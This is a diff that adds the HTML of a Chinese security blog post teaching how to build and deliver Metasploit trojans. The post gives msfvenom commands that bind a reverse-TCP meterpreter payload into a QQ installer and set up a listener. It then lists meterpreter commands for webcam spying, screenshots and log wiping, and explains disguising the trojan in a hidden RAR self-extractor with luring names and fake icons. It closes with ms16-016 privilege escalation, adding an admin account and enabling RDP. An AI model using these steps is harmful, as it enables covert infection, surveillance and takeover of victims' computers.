@@ -1,0 +1,554 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title># MSF木马使用(五) | Fr</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://kite-007.github.io/favicon.ico?v=1617547013931">
+<link rel="stylesheet" href="https://kite-007.github.io/styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="
+1. 捆绑木马
+
+1. 简要流程
+2. 肉鸡操作(meterpreter)
+
+1. 利用RAR自解压原理运行木马
+2. 对RAR木马文件进行伪装
+
+
+
+
+2. MSF提权
+
+(MSF木马使用)
+msfvenom是msfpayload,ms..." />
+    <meta name="keywords" content="MSF,kali,工具" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://kite-007.github.io">
+        <img src="https://kite-007.github.io/images/avatar.png?v=1617547013931" class="site-logo">
+        <h1 class="site-title">Fr</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="https://kite-007.github.io/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      意志坚定，持之以恒
+    </div>
+    <div class="site-footer">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://kite-007.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title"># MSF木马使用(五)</h2>
+            <div class="post-date">2021-03-31</div>
+            
+            <div class="post-content" v-pre>
+              <p><ul class="markdownIt-TOC">
+<li><a href="#1-%E6%8D%86%E7%BB%91%E6%9C%A8%E9%A9%AC">1. 捆绑木马</a>
+<ul>
+<li><a href="#1-%E7%AE%80%E8%A6%81%E6%B5%81%E7%A8%8B">1. 简要流程</a></li>
+<li><a href="#2-%E8%82%89%E9%B8%A1%E6%93%8D%E4%BD%9Cmeterpreter">2. 肉鸡操作(meterpreter)</a>
+<ul>
+<li><a href="#1-%E5%88%A9%E7%94%A8rar%E8%87%AA%E8%A7%A3%E5%8E%8B%E5%8E%9F%E7%90%86%E8%BF%90%E8%A1%8C%E6%9C%A8%E9%A9%AC">1. 利用RAR自解压原理运行木马</a></li>
+<li><a href="#2-%E5%AF%B9rar%E6%9C%A8%E9%A9%AC%E6%96%87%E4%BB%B6%E8%BF%9B%E8%A1%8C%E4%BC%AA%E8%A3%85">2. 对RAR木马文件进行伪装</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#2-msf%E6%8F%90%E6%9D%83">2. MSF提权</a></li>
+</ul>
+(MSF木马使用)<br>
+<em>msfvenom是msfpayload,msfencode的结合体，可利用msfvenom生成木马程序,并在目标机上执行,配合meterpreter在本地监听上线。</em></p>
+<p>MSF木马使用指令：msfvenom，可以查看木马使用帮助</p>
+<ul>
+<li><img src="https://kite-007.github.io/post-images/1617147958615.png" alt="" loading="lazy"></li>
+</ul>
+<p>MSF重要参数：</p>
+<pre><code>-p payload设置
+-e 编码设置
+-a 系统结构，默认x86
+-s payload最大大小
+-i 编码次数
+-f 生成文件格式
+</code></pre>
+<hr>
+<p>木马OPTIONS：</p>
+<table>
+<thead>
+<tr>
+<th>选项卡1</th>
+<th>选    项    卡   2</th>
+<th>备注</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>-l</td>
+<td>--list</td>
+<td>type&gt;</td>
+<td>列出指定类型的所有模块 类型包括: payloads, encoders, nops, platforms, archs, formats, all</td>
+</tr>
+<tr>
+<td>-p</td>
+<td>--payload</td>
+<td>payload&gt;</td>
+<td>指定需要使用的payload(有效载荷)(--list payloads得到payload列表，--list-options得到指定payload的参数)，如果需要使用自定义的payload,请使用'-'或者stdin指定</td>
+</tr>
+<tr>
+<td></td>
+<td>--list-options</td>
+<td></td>
+<td>列出指定payload的标准,高级和规避选项  例如:msfvenom -p generic/shell_bind_tcp --list-options ，将列出shell_bind_tcp这个payload的各种选项信息</td>
+</tr>
+<tr>
+<td>-f</td>
+<td>--format</td>
+<td>format&gt;</td>
+<td>指定输出格式(使用 --list formats 列出所有的格式)</td>
+</tr>
+<tr>
+<td>-e</td>
+<td>--encoding</td>
+<td>encoder&gt;</td>
+<td>要使用的编码(使用 --list encoders 列出所有的编码) 用于编码加密</td>
+</tr>
+<tr>
+<td></td>
+<td>--smallest</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>-a</td>
+<td>--arch</td>
+<td>arch&gt;</td>
+<td>指定payload的目标CPU架构(使用 --list archs 列出所有的CPU架构)</td>
+</tr>
+<tr>
+<td></td>
+<td>--platform</td>
+<td>platform&gt;</td>
+<td>指定payload的目标操作系统平台(使用 --list platforms 列出所有的操作系统平台)</td>
+</tr>
+<tr>
+<td>-o</td>
+<td>--out</td>
+<td>path&gt;</td>
+<td>将payload保存到文件中</td>
+</tr>
+<tr>
+<td>-b</td>
+<td>--bad-chars</td>
+<td>list&gt;</td>
+<td>指定不使用的字符集 例如:不使用'\x00\xff'这两个字符</td>
+</tr>
+<tr>
+<td>-n</td>
+<td>--nopsled</td>
+<td>length&gt;</td>
+<td>在payload上添加指定长度的nop指令</td>
+</tr>
+<tr>
+<td>-s</td>
+<td>--space</td>
+<td>length&gt;</td>
+<td>设定payload的最大长度    即生成的文件大小</td>
+</tr>
+<tr>
+<td></td>
+<td>--encoder-space</td>
+<td>length&gt;</td>
+<td>设定编码payload的最大长度(默认为-s的值)</td>
+</tr>
+<tr>
+<td>-i</td>
+<td>--iterations</td>
+<td>count&gt;</td>
+<td>对payload进行编码的次数</td>
+</tr>
+<tr>
+<td>-c</td>
+<td>--add-code</td>
+<td>path&gt;</td>
+<td>指定一个自己的win32 shellcode文件</td>
+</tr>
+<tr>
+<td>-x</td>
+<td>--template</td>
+<td>path&gt;</td>
+<td>指定一个可执行程序 将payload捆绑其中,例如:原先有个正常文件normal.exe 通过此选项把payload捆绑到这个程序上面</td>
+</tr>
+<tr>
+<td>-k</td>
+<td>--keep</td>
+<td></td>
+<td>针对-x中的捆绑程序 将创建新线程执行payload 一般情况-x -k选项一起使用</td>
+</tr>
+<tr>
+<td>-v</td>
+<td>--var-name</td>
+<td>value&gt;</td>
+<td>指定用于某些输出格式的自定义变量名称</td>
+</tr>
+<tr>
+<td>-t</td>
+<td>--timeout</td>
+<td>second&gt;</td>
+<td>从STDIN读取有效负载时等待的秒数(默认为30, 0为禁用)</td>
+</tr>
+<tr>
+<td>-h</td>
+<td>--help</td>
+<td></td>
+<td>查看帮助</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<ol>
+<li>msfvenmo木马生成：</li>
+</ol>
+<ul>
+<li>生成木马是由两个必要的参数-p以及-f</li>
+<li>-p：用来指定所需要设置的payload</li>
+</ul>
+<pre><code class="language-shell">./msfvenom –l payloads      //查看所有msf可用的payload列表
+</code></pre>
+<ul>
+<li>-f：用来指定payload的输出格式</li>
+</ul>
+<pre><code class="language-shell">./msfvenom -p windows/meterpreter/bind_tcp -f exe
+./msfvenom --help –formats      //查看msf支持的输出格式
+</code></pre>
+<ul>
+<li>msfvenom举例：</li>
+</ul>
+<pre><code class="language-shell">$./msfvenom -p windows/meterpreter/reverse_tcplhost=[Attacker IP]lport=4444 -f  exe -o /tmp/my_payload.exe
+</code></pre>
+<hr>
+<p><strong>这里在win 7举例</strong></p>
+<h1 id="1-捆绑木马">1. 捆绑木马</h1>
+<h2 id="1-简要流程">1. 简要流程</h2>
+<ol>
+<li>生成木马</li>
+</ol>
+<pre><code class="language-shell"># 使用MSF生成木马，并与可执行文件进行捆绑
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.200.137 -f exe -x /home/ubuntu/PCQQ2021.exe -o /home/ubuntu/桌面/QQ.exe
+
+-p：生成木马所使用的payload
+
+windows/meterpreter/reverse_tcp：申明这是一个windows系统下的一个反弹tcp
+
+还可以设置返回的端口，这里就不设置了，默认返回端口是4444
+
+-f： 代表要捆绑的文件类型，这里是一个exe文件
+
+-x：指定你要捆绑的文件的路径及文件名，这里我选择的是/home/ubuntu/里的PCQQ2020.exe
+
+-o：指定生成的木马文件的路径及文件名，这里我把它保存在原路径里，名字就叫QQ.exe
+</code></pre>
+<ol start="2">
+<li>在配置攻击模块之前，可以想办法把木马发送到目标及上面去</li>
+<li>配置攻击模块，监听连入木马的目标机</li>
+</ol>
+<pre><code class="language-shell">#使用exploit/multi/handler监听连入的backdoor
+use exploit/multi/handler
+
+#设置对应的payload。
+set payload windows/meterpreter/reverse_tcp
+
+#显示所有的设置如果需要的话，可能还需要将LHOST，LPORT,设置成与payload中相同的地址和端口。
+show options
+
+set lhost 192.168.200.137
+set lport 4444
+run
+</code></pre>
+<ol start="4">
+<li>这里直接将QQ.exe发送到目标机上面去，目标机双击运行之后，就中招了，可以看到我们拿到了meterpreter。</li>
+</ol>
+<ul>
+<li><img src="https://kite-007.github.io/post-images/1617182926105.png" alt="" loading="lazy"></li>
+</ul>
+<h2 id="2-肉鸡操作meterpreter">2. 肉鸡操作(meterpreter)</h2>
+<p>chcp 65001解决乱码问题</p>
+<pre><code>ipconfig                #查看IP信息
+shell                   #进一步获取权限
+info                    #查看已有模块信息
+getuid                  #查看权限
+getpid                  #获取当前进程的pid
+sysinfo                 #查看目标机系统信息
+ps                      #查看当前活跃进程
+kill &lt;PID值&gt;            #杀死进程
+reboot / shutdown       #重启/关机shell #进入目标机cmd shell 
+webcam_list             #查看摄像头
+webcam_snap             #通过摄像头拍照
+webcam_stream           #通过摄像头开启视频
+execute                 #在目标机中执行文件execute -H -i -f 
+cmd.exe                 #创建新进程cmd.exe，-H不可见，-i交互
+migrate &lt;pid值&gt;         #将Meterpreter会话移植到指定pid值进程中
+clearav                 #清除windows中的应用程序日志、系统日志、安全日志
+enumdesktops            #查看可用的桌面
+getdesktop              #获取当前meterpreter 关联的桌面
+set_desktop             #设置meterpreter关联的桌面 -h查看帮助
+screenshot              #截屏
+use espia               #或者使用espia模块截屏 然后输入screengrab
+run vnc                 #使用vnc远程桌面连接
+</code></pre>
+<p>这里虚拟机没有开启摄像头，所以截取了屏幕。<br>
+<img src="https://kite-007.github.io/post-images/1617183284436.png" alt="" loading="lazy"></p>
+<h3 id="1-利用rar自解压原理运行木马">1. 利用RAR自解压原理运行木马</h3>
+<ul>
+<li>如果对方就是不运行你所发送的捆绑木马文件，就可以利用RAR自解压的功能来达到目的。<br>
+<img src="https://kite-007.github.io/post-images/1617187147948.png" alt="" loading="lazy"><br>
+<img src="https://kite-007.github.io/post-images/1617187840287.png" alt="" loading="lazy"><br>
+这里有两个文件，其中一个就是刚刚所生成的捆绑木马，一个是txt文档，另外又生成了一个木马文件。<br>
+方法：</li>
+</ul>
+<ol>
+<li>全部选中，鼠标右键添加到压缩文件</li>
+</ol>
+<ul>
+<li><img src="https://kite-007.github.io/post-images/1617188798912.png" alt="" loading="lazy"></li>
+</ul>
+<hr>
+<ol start="2">
+<li>压缩文件的名字可以是充满诱惑性的，比如对方所想要的那个人的联系方式(只是名字)，注意这里的.exe并不是文件类型，后面会说他的用处。</li>
+</ol>
+<ul>
+<li><img src="https://kite-007.github.io/post-images/1617188964866.png" alt="" loading="lazy"></li>
+</ul>
+<hr>
+<ol start="3">
+<li>在文件的高级选项中，有自解压选项，打勾确定，解压路径随便指定，最好是不能被对方发现。</li>
+</ol>
+<ul>
+<li><img src="https://kite-007.github.io/post-images/1617189101373.png" alt="" loading="lazy"></li>
+</ul>
+<hr>
+<ol start="4">
+<li>在这里我想到了多种的组合方式，可以是捆绑后的.exe文件和一个正常的.txt文件，也可以是木马.exe文件和正常的.txt文件，还可以是正常的.exe文件和木马.exe文件，这就是上面所说创建了三个文件的原因。</li>
+</ol>
+<ul>
+<li><img src="https://kite-007.github.io/post-images/1617189355892.png" alt="" loading="lazy"></li>
+</ul>
+<hr>
+<ol start="5">
+<li>在模式选项卡中设置解压时隐藏所有信息，之后确定完成创建。</li>
+</ol>
+<ul>
+<li><img src="https://kite-007.github.io/post-images/1617189470051.png" alt="" loading="lazy"></li>
+<li><img src="https://kite-007.github.io/post-images/1617189481034.png" alt="" loading="lazy"></li>
+</ul>
+<hr>
+<ol start="6">
+<li>将此文件想办法发送到目标主机，之后设置监听反弹并run，等待木马运行连接。</li>
+<li>在第四步中，一个txt文件按常理历来说是达不到80多MB的，这样直接就从文件大小直接反映了问题，所以需要伪装一下。</li>
+</ol>
+<h3 id="2-对rar木马文件进行伪装">2. 对RAR木马文件进行伪装</h3>
+<ol>
+<li>这里重新弄了两个文件</li>
+</ol>
+<ul>
+<li><img src="https://kite-007.github.io/post-images/1617192336284.png" alt="" loading="lazy"></li>
+</ul>
+<hr>
+<ol start="2">
+<li>解压路径还是那样，最好不要被发现</li>
+</ol>
+<ul>
+<li><img src="https://kite-007.github.io/post-images/1617192360028.png" alt="" loading="lazy"></li>
+</ul>
+<hr>
+<ol start="4">
+<li>这里两个文件的顺序可以颠倒</li>
+</ol>
+<ul>
+<li><img src="https://kite-007.github.io/post-images/1617192367342.png" alt="" loading="lazy"></li>
+</ul>
+<hr>
+<ol start="6">
+<li>解压到临时文件夹是为了隐蔽，但是实际中是不勾选的，全部隐藏要选。</li>
+</ol>
+<ul>
+<li><img src="https://kite-007.github.io/post-images/1617192380588.png" alt="" loading="lazy"></li>
+</ul>
+<hr>
+<ol start="7">
+<li>在更新中，更改更新模式为解压并更新文件，更改覆盖模式为覆盖所有文件，这步很重要。</li>
+</ol>
+<ul>
+<li><img src="https://kite-007.github.io/post-images/1617192399285.png" alt="" loading="lazy"></li>
+</ul>
+<hr>
+<ol start="8">
+<li>使用BeCyIconGrabber以及Resource Hacker对文件进行伪装。</li>
+</ol>
+<ul>
+<li><img src="https://kite-007.github.io/post-images/1617192415771.png" alt="" loading="lazy"></li>
+</ul>
+<hr>
+<ol start="9">
+<li>目标机状况</li>
+</ol>
+<ul>
+<li><img src="https://kite-007.github.io/post-images/1617193540401.png" alt="" loading="lazy"></li>
+</ul>
+<h1 id="2-msf提权">2. MSF提权</h1>
+<p><em>提权的漏洞在./exploit/windows/local目录下</em></p>
+<ol>
+<li>我们使用上述的木马打到了，获得了shell，是user权限，但是权限并不是最高的，但是可以通过一些方式提升到system权限。</li>
+</ol>
+<ul>
+<li><img src="https://kite-007.github.io/post-images/1617199300467.png" alt="" loading="lazy"></li>
+</ul>
+<ol start="2">
+<li>输入命令。</li>
+</ol>
+<pre><code class="language-shell"># 把当前的metasploit shell转为后台运行。
+background
+
+# 我选择了ms16-016这个漏洞在进行提权
+search ms16-016
+
+# 选择漏洞，查看设置参数
+use exploit/windows/local/ms16_016_webdav
+info | show options
+* 可以看见只有一个SESSION参数要设置，是后门连接的id号，我这里是2。
+
+# 进行提权
+run | exploit
+* 虽然提权成功了 但你getuid下还是看见的是user权限
+
+# 查看进程下面，确认漏洞已经运行的PID进程685
+ps
+
+# 根据进程的提示我们确实是system权限，还要用到migrate 命令来迁移到一个指定的进程ID。
+migrate 685
+
+# getuid查看，提权成功。
+
+# 添加用户并添加为管理员组
+user a a /add
+net localgroup administrators a /add
+
+# 用Nmap扫下并没有开启远程登陆3389
+nmap -a 192.168.200.137
+
+# 开启目标主机3389
+run getgui -e  
+</code></pre>
+
+            </div>
+            
+              <div class="tag-container">
+                
+                  <a href="https://kite-007.github.io/AalKWSLE-/" class="tag">
+                    MSF
+                  </a>
+                
+                  <a href="https://kite-007.github.io/Rq675FCzM/" class="tag">
+                    kali
+                  </a>
+                
+                  <a href="https://kite-007.github.io/yHvCxoFSyJ/" class="tag">
+                    工具
+                  </a>
+                
+              </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://kite-007.github.io/msf-zhi-exploits-mo-kuai-shi-yong/">
+                  <h3 class="post-title">
+                    # MSF攻击使用(四)
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+
+
+  </body>
+</html>
